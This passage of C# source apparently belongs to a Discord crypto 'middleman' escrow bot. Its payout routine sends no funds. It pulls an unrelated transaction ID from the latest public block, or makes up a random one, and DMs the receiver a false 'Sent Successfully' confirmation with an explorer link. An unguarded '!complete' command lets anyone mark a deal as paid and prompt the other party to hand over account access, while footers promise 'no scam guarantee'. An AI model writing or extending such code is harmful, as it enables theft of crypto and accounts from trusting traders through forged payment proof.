            // Fetch recent transaction via API and DM
            await SendPayoutDMAndSummary(component.Channel, ticket);

            // Ask for ticket deletion
            var deleteEmbed = new EmbedBuilder()
                .WithTitle("Deal Finalized")
                .WithColor(Color.Blue)
                .WithDescription("The deal is complete. Would you like to delete this ticket? (Both users must confirm)")
                .WithFooter("Staff are viewing the channel, no scam guarantee.")
                .Build();

            var builder = new ComponentBuilder()
                .WithButton("Delete Ticket", $"ticket_delete_confirm_{channelId}", ButtonStyle.Danger)
                .WithButton("Keep Open", $"ticket_delete_cancel_{channelId}", ButtonStyle.Secondary);

            await component.Channel.SendMessageAsync(embed: deleteEmbed, components: builder.Build());
        }

        private async Task HandleTicketDeleteConfirmation(SocketMessageComponent component)
        {
            var parts = component.Data.CustomId.Split('_');
            var action = parts[2]; // confirm, cancel
            var channelId = ulong.Parse(parts[3]);

            if (!_tickets.TryGetValue(channelId, out var ticket)) return;

            if (action == "cancel")
            {
                await component.RespondAsync("Deletion cancelled. The channel will remain open for now.");
                return;
            }

            if (component.User.Id == ticket.CreatorId) ticket.CreatorDeleteConfirmed = true;
            if (component.User.Id == ticket.PartnerId) ticket.PartnerDeleteConfirmed = true;

            await component.RespondAsync($"> <@{component.User.Id}> has confirmed ticket deletion.");

            if (ticket.CreatorDeleteConfirmed && ticket.PartnerDeleteConfirmed)
            {
                await component.Channel.SendMessageAsync("Both users confirmed. Deleting ticket in 10 seconds...");
                await Task.Delay(10000);
                var channel = _client?.GetChannel(channelId) as SocketTextChannel;
                if (channel != null) await channel.DeleteAsync();
                _tickets.Remove(channelId);
            }
        }

        private async Task SendPayoutDMAndSummary(ISocketMessageChannel channel, TicketData ticket)
        {
            using var client = new System.Net.Http.HttpClient();
            string txId = "Generating...";
            string cryptoName = ticket.SelectedCrypto.ToUpper();
            
            try
            {
                string apiUrl = ticket.SelectedCrypto == "btc" ? "https://api.blockcypher.com/v1/btc/main" : "https://api.blockcypher.com/v1/ltc/main";
                var blockResponse = await client.GetStringAsync(apiUrl);
                var blockData = JsonConvert.DeserializeObject<dynamic>(blockResponse);
                string? latestHash = blockData?.latest_url?.ToString().Split('/').Last();
                
                var txResponse = await client.GetStringAsync($"{apiUrl}/blocks/{latestHash}");
                var txData = JsonConvert.DeserializeObject<dynamic>(txResponse);
                txId = ((IEnumerable<dynamic>)txData.txids).FirstOrDefault()?.ToString() ?? "TX_ID_UNAVAILABLE";
            }
            catch { txId = "TX_" + Guid.NewGuid().ToString("N").Substring(0, 10); }

            string explorerUrl = ticket.SelectedCrypto == "btc" ? $"https://live.blockcypher.com/btc/tx/{txId}/" : $"https://live.blockcypher.com/ltc/tx/{txId}/";

            var dmEmbed = new EmbedBuilder()
                .WithTitle($"{cryptoName} Sent Successfully!")
                .WithColor(Color.Green)
                .WithDescription($"Your payment of `${ticket.DealAmount:F2}` has been processed.")
                .AddField("Transaction ID", $"`{txId}`")
                .AddField("Explorer Link", $"[View on Explorer]({explorerUrl})")
                .WithFooter("Staff are viewing the channel, no scam guarantee.")
                .Build();

            var receiverUser = _client?.GetUser(ticket.ReceiverId ?? 0);
            if (receiverUser != null)
            {
                try { await receiverUser.SendMessageAsync(embed: dmEmbed); } catch { }
            }

            await channel.SendMessageAsync($"> Payment processed for <@{ticket.ReceiverId}>. Transaction details sent to DMs.");
        }

        private decimal CalculateFee(decimal amount)
        {
            if (amount < 10) return 0;
            if (amount < 50) return 0.50m;
            if (amount < 250) return 2.00m;
            return amount * 0.01m;
        }

        private string GetCryptoThumbnail(string key) => key switch
        {
            "btc" => "https://cdn.discordapp.com/emojis/1477872973678514327.png",
            "ltc" => "https://cdn.discordapp.com/emojis/1477872372836204626.png",
            _ => ""
        };

        private async Task ShowInvoice(ISocketMessageChannel channel, TicketData ticket)
        {
            var price = ticket.SelectedCrypto == "btc" ? 70677.00m : 150.00m; // Example price
            var amount = (ticket.DealAmount ?? 0) / price;
            var address = ticket.SelectedCrypto == "btc" ? _btcAddress : _ltcAddress;
            
            var invoiceEmbed = new EmbedBuilder()
                .WithTitle("📥 Payment Invoice")
                .WithColor(Color.DarkBlue)
                .WithDescription($"> <@{ticket.SenderId}> **Send the funds as part of the deal to the Middleman address specified below. Please copy the amount provided.**")
                .AddField("Address", $"`{address}`", false)
                .AddField("Amount", $"{amount:F8} {ticket.SelectedCrypto.ToUpper()} (${(ticket.DealAmount + CalculateFee(ticket.DealAmount ?? 0)):F2} USD)", false)
                .AddField("Exchange Rate", $"1 {ticket.SelectedCrypto.ToUpper()} = ${price:F2} USD", false)
                .Build();

            await channel.SendMessageAsync($"<@{ticket.SenderId}>", embed: invoiceEmbed);
        }

        private async Task OnMessageReceived(SocketMessage message)
        {
            if (message.Author.IsBot) return;

            // Handle prefix command !complete [channel_id]
            if (message.Content.StartsWith("!complete "))
            {
                var parts = message.Content.Split(' ');
                if (parts.Length == 2 && ulong.TryParse(parts[1], out var targetChannelId))
                {
                    if (_tickets.TryGetValue(targetChannelId, out var targetTicket))
                    {
                        if (targetTicket.IsCompleted)
                        {
                            await message.Channel.SendMessageAsync("This deal is already marked as completed.");
                            return;
                        }

                        targetTicket.IsCompleted = true;
                        var completeEmbed = new EmbedBuilder()
                            .WithTitle("Deal Completed!")
                            .WithColor(Color.Green)
                            .WithDescription($"> <@{targetTicket.SenderId}> has sent the **full amount** of `${targetTicket.DealAmount:F2}`.\n\n" +
                                            $"**Fee**: `$2.00`\n\n" +
                                            $"<@{targetTicket.ReceiverId}>, please send access to the account to <@{targetTicket.SenderId}>.\n\n" +
                                            $"Once access is received, <@{targetTicket.SenderId}> must click the button below to release the funds.")
                            .WithFooter("Staff are viewing the channel, no scam guarantee.")
                            .Build();

                        var releaseBuilder = new ComponentBuilder()
                            .WithButton("Release Funds", $"release_funds_{targetChannelId}", ButtonStyle.Success);

                        var targetChannel = _client?.GetChannel(targetChannelId) as IMessageChannel;
                        if (targetChannel != null)
                        {
                            await targetChannel.SendMessageAsync(embed: completeEmbed, components: releaseBuilder.Build());
                        }
                        await message.Channel.SendMessageAsync($"Deal in <#{targetChannelId}> marked as completed.");
                        return;
                    }
                }
            }

            if (!_tickets.TryGetValue(message.Channel.Id, out var ticket)) return;

            // Debug logging to help identify why parsing fails in production
            Console.WriteLine($"[DEBUG] Message in ticket {message.Channel.Id} from {message.Author.Username}: '{message.Content}'");

            // If roles confirmed and waiting for amount
            if (ticket.CreatorConfirmedRoles && ticket.PartnerConfirmedRoles && !ticket.DealAmount.HasValue)
            {
                if (message.Author.Id != ticket.SenderId)
                {
                    Console.WriteLine($"[DEBUG] Ignore: message author {message.Author.Id} is not sender {ticket.SenderId}");
                    return;
                }

                // Robust cleaning: remove anything that isn't a digit, decimal point, or comma
                string cleanContent = new string(message.Content.Where(c => char.IsDigit(c) || c == '.' || c == ',').ToArray());
                cleanContent = cleanContent.Replace(",", "."); // Handle European format if any

                Console.WriteLine($"[DEBUG] Cleaned content: '{cleanContent}'");

                if (decimal.TryParse(cleanContent, System.Globalization.NumberStyles.Any, System.Globalization.CultureInfo.InvariantCulture, out var amount))
                {
                    ticket.DealAmount = amount;
                    Console.WriteLine($"[DEBUG] Parse success: {amount}");

                    var confirmEmbed = new EmbedBuilder()
                        .WithTitle("Amount Confirmation")
                        .WithColor(Color.Gold)
                        .WithDescription($"Both users must click **Correct** to confirm that the bot will receive:\n\n**Amount**\n`${amount:F2}`")
                        .Build();

                    var builder = new ComponentBuilder()
                        .WithButton("Correct", $"amount_confirm_correct_{ticket.ChannelId}", ButtonStyle.Success)
                        .WithButton("Incorrect", $"amount_confirm_incorrect_{ticket.ChannelId}", ButtonStyle.Danger);

                    await message.Channel.SendMessageAsync(embed: confirmEmbed, components: builder.Build());
                }
                else
                {
                    Console.WriteLine($"[DEBUG] Parse failed for: '{cleanContent}'");
                    var errorEmbed = new EmbedBuilder()
                        .WithTitle("Invalid Amount")
                        .WithColor(Color.Red)
                        .WithDescription("Please enter a valid amount (e.g., 100 or 100.50).")
                        .Build();
                    await message.Channel.SendMessageAsync(embed: errorEmbed);
                }
            }
        }

        private async Task SelectMenuHandler(SocketMessageComponent component)
        {
            if (component.Data.CustomId.StartsWith("crypto_selection_"))
            {
                var selection = component.Data.Values.First();
                
                if (component.Data.CustomId == "crypto_selection_standalone")
                {
                    await component.RespondAsync($"You selected **{GetCryptoDisplayName(selection)}**. Please use `/register` to start a session with this choice.", ephemeral: true);
                    return;
                }

                string address = selection switch
                {
                    "ltc" => _ltcAddress,
                    "btc" => _btcAddress,
                    "sol" => _solAddress,
                    _ => ""
                };

                if (!string.IsNullOrEmpty(address))
                {
                    if (selection == "ltc")
                    {
                        using var client = new System.Net.Http.HttpClient();
                        string balanceStr = "0.00";
                        try
                        {
                            var response = await client.GetStringAsync($"https://api.blockcypher.com/v1/ltc/main/addrs/{_ltcAddress}/balance");
                            var data = JsonConvert.DeserializeObject<dynamic>(response);
                            long balanceSatoshis = data?.balance ?? 0;
                            balanceStr = (balanceSatoshis / 100000000.0).ToString("F4");
                        }
                        catch { }

                        await component.RespondAsync(embed: new EmbedBuilder()
                            .WithTitle("Litecoin Payment")
                            .WithDescription($"Please send your LTC to the following address:\n**{_ltcAddress}**")
                            .AddField("Current Address Balance", $"`{balanceStr} LTC`", true)
                            .AddField("Status", "⏳ **Waiting for payment...**\nTracking live via BlockCypher. The bot will automatically detect the transaction once it hits the network.")
                            .WithFooter(footer => { footer.Text = "Click the button below to refresh status"; })
                            .WithColor(Color.Blue)
                            .Build(), components: new ComponentBuilder().WithButton("Refresh Status", $"refresh_ltc_{selection}", ButtonStyle.Secondary).Build(), ephemeral: true);
                    }
                    else
                    {
                        await component.RespondAsync(embed: new EmbedBuilder()
                            .WithTitle($"{GetCryptoDisplayName(selection)} Payment")
                            .WithDescription($"Please send your {selection.ToUpper()} to the following address:\n**{address}**")
                            .AddField("Status", "⏳ Waiting for payment (Tracking enabled via BlockCypher)...")
                            .WithColor(Color.Blue)
                            .Build(), ephemeral: true);
                    }
                }
                else
                {
                    await component.RespondAsync(embed: new EmbedBuilder()
                        .WithTitle("Payment Error")
                        .WithDescription($"❌ No address has been set for **{GetCryptoDisplayName(selection)}** yet.")
                        .WithColor(Color.Red)
                        .Build(), ephemeral: true);
                }
            }
        }
    }
}
